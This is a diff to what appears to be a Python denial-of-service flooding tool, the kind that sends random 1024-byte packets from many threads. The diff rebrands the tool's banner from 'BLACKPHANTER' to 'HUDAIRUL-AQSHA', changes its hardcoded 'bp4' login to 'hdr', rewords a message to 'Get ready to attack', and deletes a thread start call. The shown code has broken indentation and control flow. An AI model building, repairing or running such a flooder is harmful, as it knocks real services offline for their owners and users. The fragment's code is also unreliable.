@@ -30,8 +30,8 @@ while attemps < 100:
     username = input("\033[32mEnter your username: \033[0m")
     password = input("\033[31mEnter your password: \033[0m")
 
-    if username == 'bp4' and password == 'bp4':
-        print("\033[32m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
+    if username == 'hdr' and password == 'hdr':
+        print("\033[32m⟩⟩ Hai...! Welcome to zona attack HUDAIRUL-AQSHA \033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -44,7 +44,7 @@ times = int(input("\033[33m Time :\033[0m"))
 threads = int(input("\033[37m Threads :\033[0m"))
 
 time.sleep(5),
-print("\033[33m  ⟩⟩  Welcome to zana attack....!!! \033[0m "),
+print("\033[33m  ⟩⟩  Get ready to attack....!!! \033[0m "),
 
 def run():
 	data = random._urandom(1024)
@@ -81,7 +81,6 @@ def run2():
 			
 for x in range(threads):
 	        th = threading.Thread(target = run)
-		th.start()
 	else:
 	        th = threading.Thread(target = run2)
 		
